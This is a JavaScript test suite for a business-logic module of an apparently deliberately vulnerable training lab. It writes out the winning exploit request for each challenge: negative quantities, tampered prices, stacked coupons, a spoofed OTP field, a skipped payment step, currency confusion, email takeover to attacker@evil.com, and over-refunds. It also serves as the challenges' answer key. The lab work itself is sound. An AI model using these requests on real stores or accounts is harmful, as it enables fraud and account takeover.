'use strict';
// Business Logic Flaws module: every challenge must be solvable by the
// documented technique and must NOT be solvable by the obvious shortcut.
const test = require('node:test');
const assert = require('node:assert/strict');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

test('bizlogic module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'bizlogic', id);

  // Full email-takeover chain, returns the final reset response.
  async function takeOverEmail(c, newEmail, newPassword) {
    await c.post('/bizlogic/account/email', { new_email: newEmail });
    const forgot = await c.post('/bizlogic/account/forgot', { email: newEmail });
    const m = forgot.text.match(/Token: <code>([0-9a-f]{32})<\/code>/);
    assert.ok(m, 'reset token should be shown on the page');
    return c.post('/bizlogic/account/reset', { token: m[1], new_password: newPassword });
  }

  await t.test('module page renders, links resolve, no em dash', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/bizlogic');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.ok(!/<table>/.test(text), 'unstyled table');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 8);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of [
      '/bizlogic/negative-qty', '/bizlogic/price-tamper', '/bizlogic/coupon-stack',
      '/bizlogic/otp', '/bizlogic/workflow', '/bizlogic/currency',
      '/bizlogic/account', '/bizlogic/refund', '/bizlogic/reset',
    ]) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('negative-qty: buying 1 gives nothing, buying -1 credits the balance and earns the flag', async () => {
    const benign = await client(srv.base).post('/bizlogic/negative-qty', { qty: '1' });
    assert.equal(benign.status, 200);
    assert.equal((benign.text.match(FLAG_RE) || []).length, 0);
    const c = client(srv.base);
    const hit = await c.post('/bizlogic/negative-qty', { qty: '-1' });
    assert.ok(hit.text.includes(flagOf('biz-negative-qty')));
    assert.ok((await capturedSet(c)).includes('bizlogic:Negative Quantity Credit'));
  });

  await t.test('price-tamper: paying the catalog price gives nothing, tampered price earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.post('/bizlogic/price-tamper/buy', { product_id: 'hoodie', price: '50' });
    assert.equal((benign.text.match(FLAG_RE) || []).length, 0, 'full price must not award');
    const hit = await c.post('/bizlogic/price-tamper/buy', { product_id: 'hoodie', price: '1' });
    assert.ok(hit.text.includes(flagOf('biz-price-tamper')));
    assert.ok((await capturedSet(c)).includes('bizlogic:Client-Side Price Tampering'));
  });

  await t.test('coupon-stack: one coupon gives nothing, three stacked coupons earn the flag', async () => {
    const c = client(srv.base);
    const benign = await c.post('/bizlogic/coupon-stack', { codes: 'SAVE50' });
    assert.equal((benign.text.match(FLAG_RE) || []).length, 0, 'one coupon must not award');
    const two = await c.post('/bizlogic/coupon-stack', { codes: 'SAVE50,SAVE40' });
    assert.equal((two.text.match(FLAG_RE) || []).length, 0, 'two coupons still pay 10%, must not award');
    const hit = await c.post('/bizlogic/coupon-stack', { codes: 'SAVE50,SAVE40,SAVE30' });
    assert.ok(hit.text.includes(flagOf('biz-coupon-stack')));
    assert.ok((await capturedSet(c)).includes('bizlogic:Coupon Stacking Past 100%'));
  });

  await t.test('otp-client: wrong OTP without the flag field fails, real OTP gives nothing, spoofed field earns the flag', async () => {
    const c = client(srv.base);
    const failed = await c.post('/bizlogic/otp/verify', { otp: '000000', otp_ok: '0' });
    assert.ok(failed.text.includes('Verification failed'));
    assert.equal((failed.text.match(FLAG_RE) || []).length, 0);
    const real = await c.post('/bizlogic/otp/verify', { otp: '739184', otp_ok: '1' });
    assert.equal((real.text.match(FLAG_RE) || []).length, 0, 'the real OTP is not the exploit');
    const hit = await c.post('/bizlogic/otp/verify', { otp: '000000', otp_ok: '1' });
    assert.ok(hit.text.includes(flagOf('biz-otp-client')));
    assert.ok((await capturedSet(c)).includes('bizlogic:OTP Verified by JavaScript'));
  });

  await t.test('workflow-skip: pay then confirm gives nothing, skipping payment earns the flag', async () => {
    const c = client(srv.base);
    const empty = await c.post('/bizlogic/workflow/confirm', {});
    assert.equal((empty.text.match(FLAG_RE) || []).length, 0, 'confirm with an empty cart must not award');
    await c.post('/bizlogic/workflow/cart', { product_id: 'hoodie' });
    await c.post('/bizlogic/workflow/pay', {});
    const legit = await c.post('/bizlogic/workflow/confirm', {});
    assert.equal((legit.text.match(FLAG_RE) || []).length, 0, 'the paid flow is not the exploit');
    await c.post('/bizlogic/workflow/cart', { product_id: 'hoodie' });
    const hit = await c.post('/bizlogic/workflow/confirm', {});
    assert.ok(hit.text.includes(flagOf('biz-workflow-skip')));
    assert.ok((await capturedSet(c)).includes('bizlogic:Checkout Step Skipped'));
  });

  await t.test('currency: paying in EUR gives nothing, paying 50 JPY earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.post('/bizlogic/currency/pay', { amount: '50', currency: 'EUR' });
    assert.equal((benign.text.match(FLAG_RE) || []).length, 0, 'EUR payment must not award');
    const hit = await c.post('/bizlogic/currency/pay', { amount: '50', currency: 'JPY' });
    assert.ok(hit.text.includes(flagOf('biz-currency')));
    assert.ok((await capturedSet(c)).includes('bizlogic:Currency Confusion'));
  });

  await t.test('email-noreauth: password reset on the original email gives nothing, email change plus reset earns the flag', async () => {
    const c = client(srv.base);
    const forgot = await c.post('/bizlogic/account/forgot', { email: 'victim@pentrix.lab' });
    const m = forgot.text.match(/Token: <code>([0-9a-f]{32})<\/code>/);
    assert.ok(m, 'reset token should be shown on the page');
    const benign = await c.post('/bizlogic/account/reset', { token: m[1], new_password: 'newpass123' });
    assert.equal((benign.text.match(FLAG_RE) || []).length, 0, 'a reset without an email change must not award');
    const hit = await takeOverEmail(c, 'attacker@evil.com', 'pwned123');
    assert.ok(hit.text.includes(flagOf('biz-email-noreauth')));
    assert.ok((await capturedSet(c)).includes('bizlogic:Email Change Without Re-Authentication'));
  });

  await t.test('refund: refunding the exact order total gives nothing, over-refunding earns the flag', async () => {
    const c = client(srv.base);
    await c.post('/bizlogic/refund/buy', { product_id: 'hoodie' });
    const benign = await c.post('/bizlogic/refund', { order_id: '1', amount: '50' });
    assert.equal((benign.text.match(FLAG_RE) || []).length, 0, 'an exact refund must not award');
    const hit = await c.post('/bizlogic/refund', { order_id: '1', amount: '5000' });
    assert.ok(hit.text.includes(flagOf('biz-refund')));
    assert.ok((await capturedSet(c)).includes('bizlogic:Tampered Refund Amount'));
  });

  await t.test('scoreboard counts each captured challenge once', async () => {
    const c = client(srv.base);
    await c.post('/bizlogic/negative-qty', { qty: '-1' });
    await c.post('/bizlogic/price-tamper/buy', { product_id: 'hoodie', price: '1' });
    await c.post('/bizlogic/coupon-stack', { codes: 'SAVE50,SAVE40,SAVE30' });
    await c.post('/bizlogic/otp/verify', { otp: '000000', otp_ok: '1' });
    await c.post('/bizlogic/workflow/cart', { product_id: 'hoodie' });
    await c.post('/bizlogic/workflow/confirm', {});
    await c.post('/bizlogic/currency/pay', { amount: '50', currency: 'JPY' });
    await takeOverEmail(c, 'attacker@evil.com', 'pwned123');
    await c.post('/bizlogic/refund/buy', { product_id: 'hoodie' });
    await c.post('/bizlogic/refund', { order_id: '1', amount: '5000' });
    // Capture again: repeats must not duplicate the scoreboard entries.
    await c.post('/bizlogic/negative-qty', { qty: '-1' });
    const got = (await capturedSet(c)).filter((s) => s.startsWith('bizlogic:'));
    assert.deepEqual([...new Set(got)].sort(), [
      'bizlogic:Email Change Without Re-Authentication',
      'bizlogic:Checkout Step Skipped',
      'bizlogic:Client-Side Price Tampering',
      'bizlogic:Coupon Stacking Past 100%',
      'bizlogic:Currency Confusion',
      'bizlogic:Negative Quantity Credit',
      'bizlogic:OTP Verified by JavaScript',
      'bizlogic:Tampered Refund Amount',
    ].sort());
    assert.equal(got.length, 8);
  });
});
